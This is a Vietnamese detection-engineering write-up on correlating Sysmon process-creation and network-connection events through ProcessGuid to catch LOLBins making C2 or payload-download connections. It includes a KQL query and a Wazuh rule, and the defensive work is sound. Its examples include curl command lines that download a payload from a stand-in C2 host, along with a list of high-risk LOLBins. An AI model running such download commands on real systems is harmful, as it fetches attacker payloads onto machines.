# DEC-005 — Tài Liệu Kỹ Thuật Phát Hiện: Tương Quan Tiến Trình và Kết Nối Mạng (Sysmon Event ID 1 & 3)

## 1. Tổng Quan Cơ Chế Phát Hiện (Detection Overview)
*   **Mã Phân Tích (Detection ID):** DEC-005
*   **Tên Cảnh Báo (Rule Name):** Suspicious Process to Network Connection Correlation
*   **Mục Tiêu Giám Sát (Detection Objective):** Phát hiện các hành vi kết nối mạng bất thường từ các tiến trình hệ thống hoặc công cụ LOLBins (Living-Off-The-Land Binaries), qua đó tôi xác định các hoạt động Command and Control (C2), Data Exfiltration hoặc Payload Download.
*   **Nguồn Nhật Ký (Log Source):** `Microsoft-Windows-Sysmon/Operational`
*   **Sự Kiện Trọng Tâm (Target Event IDs):**
    *   Sysmon `Event ID 1`: Process Creation (Khởi tạo tiến trình)
    *   Sysmon `Event ID 3`: Network Connection (Kết nối mạng)
*   **Tiến Trình Trọng Điểm Phân Tích (Focus Artifact):** `curl.exe`, `powershell.exe`, `certutil.exe`
*   **Nền Tảng Áp Dụng (Platform):** Windows

## 2. Ánh Xạ Khung MITRE ATT&CK (MITRE ATT&CK Mapping)
Trong nghiên cứu của tôi, việc tương quan giữa Event ID 1 và 3 đóng vai trò sống còn trong việc bao phủ các kỹ thuật tinh vi của kẻ tấn công:
*   **Tactic:** Command and Control (TA0011), Execution (TA0002), Exfiltration (TA0010)
*   **Techniques:**
    *   T1105 - Ingress Tool Transfer (Tải công cụ/payload từ máy chủ bên ngoài)
    *   T1571 - Non-Standard Port (Sử dụng cổng mạng không tiêu chuẩn)
    *   T1071 - Application Layer Protocol (Giao tiếp C2 qua giao thức HTTP/HTTPS)
    *   T1059 - Command and Scripting Interpreter (Thực thi qua CommandLine)

## 3. Kiến Trúc Kỹ Thuật Bóc Tách Sự Kiện (Telemetry Parsing & Engineering Logic)
Trong môi trường SOC do tôi thiết lập, việc chỉ dựa vào tường lửa (Firewall/NGFW) để phát hiện kết nối độc hại là không đủ. Tường lửa cung cấp dữ liệu 5-tuple (Source IP, Dest IP, Source Port, Dest Port, Protocol) nhưng hoàn toàn mù mờ về ngữ cảnh Endpoint (tiến trình nào đã tạo ra luồng mạng đó). Tôi đã sử dụng Sysmon để thu hẹp khoảng cách này thông qua sự kết hợp của Event ID 1 và Event ID 3.

### 3.1 Bóc Tách Sự Kiện Mạng (Sysmon Event ID 3 - Network Connection)
Khi một tiến trình khởi tạo socket mạng, Sysmon sẽ ghi nhận Event ID 3.
*   **Network Artifacts:** Tôi trích xuất các trường dữ liệu quan trọng như `DestinationIp`, `DestinationPort` (ví dụ: 443, 80, 8080), và `Protocol` (TCP/UDP).
*   **Process Identification:** Trường `Image` giúp tôi xác định đường dẫn tệp thực thi (ví dụ: `C:\Windows\System32\curl.exe`).
*   **Hạn Chế Của Event ID 3 (The Blind Spot):** Event ID 3 không chứa trường `CommandLine` (dòng lệnh khởi chạy tiến trình) và `ParentImage` (tiến trình cha). Hệ thống SIEM sẽ không thể giải đáp câu hỏi: *"Tiến trình `curl.exe` đã được gọi với tham số nào và bởi ứng dụng nào?"*

### 3.2 Bóc Tách Sự Kiện Khởi Tạo Tiến Trình (Sysmon Event ID 1 - Process Creation)
Sysmon Event ID 1 chứa toàn bộ ngữ cảnh khởi chạy của một tiến trình mà tôi cần thu thập:
*   **Execution Context:** Trường `CommandLine` chứa chuỗi tham số đầy đủ (ví dụ: `curl.exe -o C:\Temp\malware.exe https://malicious-c2.com/payload.bin`).
*   **Process Lineage:** `ParentImage` và `ParentCommandLine` giúp tôi truy xuất chuỗi thực thi (ví dụ: `cmd.exe` -> `curl.exe`).
*   **Hashing:** Trường `Hashes` (MD5, SHA256, IMPHASH) hỗ trợ tôi trong việc tra cứu IOC (Indicator of Compromise) trên VirusTotal hoặc Threat Intelligence.

## 4. Kiến Trúc Tương Quan và Logic Phát Hiện (Correlation Architecture)
Để vẽ nên bức tranh toàn cảnh, tôi xây dựng Rule tương quan chéo (Cross-correlation) dựa trên **Khóa Tương Quan (Correlation Key)**.

### 4.1 Khóa Tương Quan Duy Nhất (ProcessGuid)
`ProcessGuid` (ví dụ: `{A1B2C3D4-5678-90AB-CDEF-1234567890AB}`) là một định danh duy nhất (Globally Unique Identifier) do Sysmon tạo ra cho mỗi tiến trình từ lúc sinh ra đến lúc kết thúc (Terminate). Tôi nhận thấy khóa này đáng tin cậy hơn PID (Process ID) vì PID có thể bị hệ điều hành tái sử dụng (Process ID Reuse).

### 4.2 Logic Xây Dựng Chuỗi Truy Vết (Process-to-Network Chain)
Cơ chế tương quan trong SIEM do tôi thiết lập tuân theo quy trình sau:
1.  **Trigger (Cò Súng):** SIEM tiếp nhận Sysmon Event ID 3 từ các tiến trình nhạy cảm (như `curl.exe`, `powershell.exe`). SIEM trích xuất `ProcessGuid`.
2.  **Look-back Query (Truy Vấn Ngược):** SIEM tự động thực hiện truy vấn lịch sử (thường trong khoảng thời gian 5-15 phút trước đó) để tìm kiếm Sysmon Event ID 1 có trường `ProcessGuid` trùng khớp với Event ID 3.
    *   *Ví dụ KQL (Kusto Query Language):*
        ```kusto
        let NetworkEvents = Sysmon_Event_3
        | where Image endswith "curl.exe"
        | project ProcessGuid, DestinationIp, DestinationPort;
        let ProcessEvents = Sysmon_Event_1
        | project ProcessGuid, CommandLine, ParentImage, Hashes;
        NetworkEvents
        | join kind=inner (ProcessEvents) on ProcessGuid
        ```
3.  **Alert Generation (Tạo Cảnh Báo):** Hợp nhất siêu dữ liệu (metadata) từ hai sự kiện. Cảnh báo cuối cùng gửi đến tôi sẽ có dạng đầy đủ:
    *   *Tiến trình cha `cmd.exe` đã khởi chạy `curl.exe` với dòng lệnh `curl.exe -s http://192.168.1.100/beacon.exe`. Sau đó, tiến trình này thiết lập kết nối TCP đến `192.168.1.100` qua cổng `80`.*

## 5. Chiến Lược Tinh Chỉnh SIEM/Wazuh (Tuning Strategy & Noise Reduction)
Tôi nhận thấy bật Event ID 3 mà không có bộ lọc (Filter) sẽ dẫn đến tình trạng quá tải Log (Log Exhaustion) và lãng phí EPS (Events Per Second).

### 5.1 Cấu Hình Sysmon.xml (Endpoint Level Tuning)
Tôi tiến hành lọc (Drop) các kết nối mạng hợp lệ ngay tại Agent để tránh gửi rác về SIEM:
*   **Loại trừ trình duyệt web:** Bỏ qua các Event ID 3 xuất phát từ `chrome.exe`, `msedge.exe`, `firefox.exe` tới các port `80, 443`.
*   **Loại trừ kết nối nội bộ:** Bỏ qua các kết nối LAN-to-LAN không quan trọng hoặc broadcast traffic.
*   **Tập trung vào tiến trình nguy cơ cao (High-risk Binaries):** Chỉ ghi nhận Event ID 3 một cách chi tiết đối với danh sách các LOLBins (ví dụ: `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe`, `regsvr32.exe`, `certutil.exe`).

### 5.2 SIEM Logic Tuning (Tuning tại Server)
*   **Whitelisting Domains/IPs:** Tôi tích hợp Threat Intelligence. Hệ thống chỉ cảnh báo nếu `DestinationIp` nằm trong danh sách Blacklist hoặc không thuộc dải IP nội bộ/Domain hợp lệ của công ty.
*   **Thresholds & Behavioral Baselines:** Tôi sử dụng thuật toán thống kê (như kiểm đếm số lần kết nối bất thường của một tiến trình trong 24 giờ) để phát hiện hành vi C2 Beaconing (kết nối lặp đi lặp lại có chu kỳ).

## 6. Mẫu Luật Wazuh (Wazuh SIEM Rule Example)
Dưới đây là mô phỏng luật tương quan trên Wazuh mà tôi đã thiết lập, kết nối Event ID 1 và 3:
```xml
<group name="sysmon, process_network_correlation,">
  <rule id="100050" level="10" frequency="2" timeframe="120">
    <if_matched_sid>100000</if_matched_sid> <!-- Giả sử 100000 là Rule bắt Sysmon Event 1 của LOLBins -->
    <same_field>win.eventdata.processGuid</same_field>
    <match>Microsoft-Windows-Sysmon/Operational</match>
    <field name="win.system.eventID">^3$</field>
    <description>Suspicious Network Connection Initiated by LOLBin (Correlation via ProcessGuid)</description>
    <mitre>
      <id>T1105</id>
      <id>T1571</id>
    </mitre>
  </rule>
</group>
```

Tài liệu này đóng vai trò tiêu chuẩn cốt lõi trong nghiên cứu của tôi và quá trình săn lùng mối đe dọa (Threat Hunting) khi điều tra các sự cố liên quan đến tương quan chuỗi tiến trình và mạng.
